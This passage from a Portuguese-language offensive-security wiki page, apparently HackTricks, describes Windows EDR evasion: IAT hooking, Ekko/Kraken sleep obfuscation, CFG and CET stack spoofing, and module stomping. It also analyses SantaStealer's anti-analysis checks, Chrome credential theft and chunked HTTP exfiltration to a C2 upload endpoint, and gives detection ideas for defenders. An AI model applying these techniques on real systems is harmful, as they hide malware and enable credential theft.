- PIC call-stack spoofing stubs (por exemplo, Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via um PICO residente

Se você controla um reflective loader, pode hookar imports **durante** `ProcessImports()` substituindo o ponteiro `GetProcAddress` do loader por um resolvedor customizado que verifica hooks primeiro:

- Construa um **resident PICO** (persistent PIC object) que sobreviva depois que o PIC transitório do loader se liberar.
- Exponha uma função `setup_hooks()` que sobrescreve o resolvedor de imports do loader (por exemplo, `funcs.GetProcAddress = _GetProcAddress`).
- Em `_GetProcAddress`, ignore imports por ordinal e use uma busca de hook baseada em hash como `__resolve_hook(ror13hash(name))`. Se existir um hook, retorne-o; caso contrário, delegue para o `GetProcAddress` real.
- Registre targets de hook em tempo de link com entradas Crystal Palace `addhook "MODULE$Func" "hook"`. O hook permanece válido porque vive dentro do resident PICO.

Isso produz **import-time IAT redirection** sem fazer patch da section de código do DLL carregado após o load.

### Forçando imports hookable quando o target usa PEB-walking

Import-time hooks só disparam se a função realmente estiver na IAT do target. Se um módulo resolve APIs via PEB-walk + hash (sem entrada de import), force um import real para que o caminho `ProcessImports()` do loader o enxergue:

- Substitua a resolução de export por hash (por exemplo, `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) por uma referência direta como `&WaitForSingleObject`.
- O compilador emite uma entrada de IAT, habilitando a interceptação quando o reflective loader resolve imports.

### Sleep/idle obfuscation estilo Ekko sem patchar `Sleep()`

Em vez de patchar `Sleep`, hooke as **primitivas reais de wait/IPC** que o implant usa (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Para waits longos, envolva a chamada em uma cadeia de obfuscation estilo Ekko que criptografa a imagem em memória durante o idle:

- Use `CreateTimerQueueTimer` para agendar uma sequência de callbacks que chamam `NtContinue` com frames `CONTEXT` forjados.
- Cadeia típica (x64): definir a imagem para `PAGE_READWRITE` → criptografar com RC4 via `advapi32!SystemFunction032` sobre a imagem mapeada completa → executar o wait bloqueante → descriptografar com RC4 → **restaurar permissões por section** caminhando pelas sections PE → sinalizar conclusão.
- `RtlCaptureContext` fornece um `CONTEXT` modelo; clone-o em múltiplos frames e ajuste registers (`Rip/Rcx/Rdx/R8/R9`) para invocar cada etapa.

Detalhe operacional: retorne “success” para waits longos (por exemplo, `WAIT_OBJECT_0`) para que o caller continue enquanto a imagem está mascarada. Esse padrão oculta o módulo de scanners durante janelas de idle e evita a assinatura clássica de “patched `Sleep()`”.

Ideias de detecção (baseadas em telemetria)
- Rajadas de callbacks de `CreateTimerQueueTimer` apontando para `NtContinue`.
- `advapi32!SystemFunction032` usado em buffers grandes contíguos do tamanho de uma image.
- `VirtualProtect` em grande faixa seguido de restauração customizada de permissões por section.

### Registro runtime de CFG para gadgets de sleep-obfuscation

Em targets com CFG habilitado, o primeiro salto indireto para um gadget no meio da função, como `jmp [rbx]` ou `jmp rdi`, normalmente derruba o processo com `STATUS_STACK_BUFFER_OVERRUN` porque o gadget não está nos metadados CFG do módulo. Para manter cadeias estilo Ekko/Kraken vivas dentro de processos hardened:

- Registre cada destino indireto usado pela cadeia com `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` e entradas `CFG_CALL_TARGET_VALID`.
- Para endereços dentro de imagens carregadas (`ntdll`, `kernel32`, `advapi32`), o `MEMORY_RANGE_ENTRY` deve começar na **base da image** e cobrir o **tamanho total da image**.
- Para regiões manually mapped/PIC/stomped, use a **allocation base** e o tamanho da alocação.
- Marque não só o gadget de dispatch, mas também exports alcançados indiretamente (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, syscalls de wait/event) e quaisquer seções executáveis controladas pelo atacante que virarão alvos indiretos.

Isso transforma cadeias de sleep estilo ROP/JOP de “só funciona em processos sem CFG” em uma primitive reutilizável para `explorer.exe`, browsers, `svchost.exe` e outros endpoints compilados com `/guard:cf`.

### CET-safe stack spoofing para threads dormindo

A substituição total de `CONTEXT` é barulhenta e pode quebrar em sistemas CET Shadow Stack porque um `Rip` spoofado ainda precisa concordar com a shadow stack de hardware. Um padrão mais seguro de sleep-masking é:

- Escolha outra thread no mesmo processo e leia os limites de stack do `NT_TIB` / TEB (`StackBase`, `StackLimit`) via `NtQueryInformationThread`.
- Faça backup do real TEB/TIB da thread atual.
- Capture o contexto real de sleep com `GetThreadContext`.
- Copie **apenas** o `Rip` real para o spoof context, deixando o estado spoofado de `Rsp`/stack intacto.
- Durante a janela de sleep, copie o `NT_TIB` da thread spoofada para o TEB atual para que stack walkers unwinding dentro de um intervalo de stack legítimo.
- Depois que o wait terminar, restaure o TIB e o thread context originais.

Isso preserva um instruction pointer consistente com CET enquanto engana stack walkers de EDR que confiam nos metadados de stack do TEB para validar unwinds.

### Alternativa baseada em APC: Kraken Mask

Se a dispatch de timer-queue for muito signatured, a mesma sequência sleep-encrypt-spoof-restore pode ser executada a partir de uma helper thread suspensa usando APCs enfileirados:

- Crie uma helper thread com `NtTestAlert` como entrypoint.
- Enfileire frames/APCs `CONTEXT` preparados com `NtQueueApcThread` e drene-os com `NtAlertResumeThread`.
- Armazene o estado da cadeia na heap em vez da stack da helper para evitar esgotar a stack padrão de 64 KB da thread.
- Use `NtSignalAndWaitForSingleObject` para sinalizar atomicamente o evento de início e bloquear.
- Suspenda a main thread antes de restaurar o TIB/context (`NtSuspendThread` → restore → `NtResumeThread`) para reduzir a janela de race em que um scanner pode capturar uma stack parcialmente restaurada.

Isso troca a assinatura `CreateTimerQueueTimer` + `NtContinue` por uma assinatura de helper-thread/APC, mantendo os mesmos objetivos de masking RC4 e stack-spoofing.

Ideias adicionais de detecção
- `NtSetInformationVirtualMemory` com `VmCfgCallTargetInformation` logo antes de sleeps, waits ou dispatch de APC.
- `GetThreadContext`/`SetThreadContext` em volta de `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` ou `ConnectNamedPipe`.
- `NtQueryInformationThread` seguido de writes diretos nos limites de stack do TEB/TIB da thread atual.
- Cadeias `NtQueueApcThread`/`NtAlertResumeThread` que alcançam indiretamente `SystemFunction032`, `VirtualProtect` ou helpers de restauração de permissões de section.
- Uso repetido de assinaturas curtas de gadget como `FF 23` (`jmp [rbx]`) ou `FF E7` (`jmp rdi`) como pivôs de dispatch dentro de módulos assinados.


## Precision Module Stomping

Module stomping executa payloads a partir da **section `.text` de um DLL já mapeado dentro do processo alvo** em vez de alocar memória privada executável óbvia ou carregar um novo DLL sacrificial. O alvo de overwrite deve ser uma **imagem carregada com suporte em disco** cujo espaço de código consiga absorver o payload sem corromper caminhos de código que o processo ainda precisa.

### Seleção confiável de alvo

Module stomping ingênuo contra módulos comuns como `uxtheme.dll` ou `comctl32.dll` é frágil: o DLL pode não estar carregado no processo remoto, e uma região de código pequena demais fará o processo crashar. Um fluxo de trabalho mais confiável é:

1. Enumere os módulos do processo alvo e mantenha uma **allowlist apenas de nomes** de DLLs já carregados.
2. Construa o payload primeiro e registre seu **tamanho exato em bytes**.
3. Faça scan de DLLs candidatos em disco e compare a **`.text` `Misc_VirtualSize`** da section PE com o tamanho do payload. Isso importa mais que o file size porque reflete o tamanho da section executável **quando mapeada em memória**.
4. Faça parse da **Export Address Table (EAT)** e escolha um RVA de função exportada como offset inicial do stomp.
5. Calcule o **blast radius**: se o payload exceder o boundary da função selecionada, ele sobrescreverá exports adjacentes dispostos depois dela em memória.

Helpers típicos de recon/seleção vistos na prática:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Notas operacionais
- Prefira DLLs **já carregadas** no processo remoto para evitar a telemetria de `LoadLibrary`/cargas de imagem inesperadas.
- Prefira exports que raramente são executados pela aplicação alvo; caso contrário, caminhos normais de código podem atingir os bytes stompados antes ou depois da criação da thread.
- Implantes grandes muitas vezes exigem mudar a incorporação do shellcode de uma string literal para um **byte-array/braced initializer** para que o buffer completo seja representado corretamente no source do injector.

Ideias de detecção
- Escritas remotas em páginas executáveis **image-backed** (`MEM_IMAGE`, `PAGE_EXECUTE*`) em vez das alocações privadas RWX/RX mais comuns.
- Pontos de entrada de export cujo bytes em memória não correspondem mais ao arquivo backing no disco.
- Threads remotas ou pivôs de contexto que iniciam a execução dentro de um export legítimo de DLL cujos primeiros bytes foram modificados recentemente.
- Sequências suspeitas de `VirtualProtect(Ex)` / `WriteProcessMemory` contra páginas `.text` de DLL seguidas de criação de thread.

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) ilustra como modernos info-stealers combinam AV bypass, anti-analysis e acesso a credenciais em um único workflow.

### Keyboard layout gating & sandbox delay

- Uma flag de config (`anti_cis`) enumera os layouts de teclado instalados via `GetKeyboardLayoutList`. Se um layout cirílico for encontrado, a sample grava um marcador vazio `CIS` e termina antes de executar stealers, garantindo que nunca se detone em locales excluídos enquanto deixa um hunting artifact.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Lógica em camadas de `check_antivm`

- A variante A percorre a lista de processos, faz hash de cada nome com um checksum rolante personalizado e o compara com blocklists embutidas para debuggers/sandboxes; ela repete o checksum sobre o nome do computador e verifica diretórios de trabalho como `C:\analysis`.
- A variante B inspeciona propriedades do sistema (limiar mínimo de contagem de processos, uptime recente), chama `OpenServiceA("VBoxGuest")` para detectar adições do VirtualBox e realiza verificações de timing em torno de sleeps para detectar single-stepping. Qualquer detecção aborta antes do lançamento dos modules.

### Helper fileless + reflective loading duplo com ChaCha20

- O DLL/EXE principal embute um Chromium credential helper que é ou gravado em disco ou mapeado manualmente em memória; o modo fileless resolve imports/relocations por conta própria para que nenhum artefato do helper seja escrito.
- Esse helper armazena um DLL de segunda etapa criptografado duas vezes com ChaCha20 (duas chaves de 32 bytes + nonces de 12 bytes). Após as duas passagens, ele faz reflective load do blob (sem `LoadLibrary`) e chama os exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` derivados de [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- As rotinas do ChromElevator usam reflective process hollowing com direct-syscall para injetar em um browser Chromium em execução, herdar as chaves de AppBound Encryption e descriptografar passwords/cookies/credit cards diretamente dos bancos SQLite apesar do endurecimento do ABE.


### Coleta modular em memória & exfiltração HTTP em chunks

- `create_memory_based_log` percorre uma tabela global de ponteiros de função `memory_generators` e cria uma thread por module habilitado (Telegram, Discord, Steam, screenshots, documents, browser extensions, etc.). Cada thread escreve os resultados em buffers compartilhados e informa sua contagem de arquivos após uma janela de join de ~45s.
- Quando termina, tudo é compactado com a biblioteca `miniz` estaticamente linkada como `%TEMP%\\Log.zip`. `ThreadPayload1` então dorme 15s e envia o archive em chunks de 10 MB via HTTP POST para `http://<C2>:6767/upload`, falsificando um boundary de browser `multipart/form-data` (`----WebKitFormBoundary***`). Cada chunk adiciona `User-Agent: upload`, `auth: <build_id>`, `w: <campaign_tag>` opcional, e o último chunk acrescenta `complete: true` para que o C2 saiba que a remontagem foi concluída.

## References


- [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
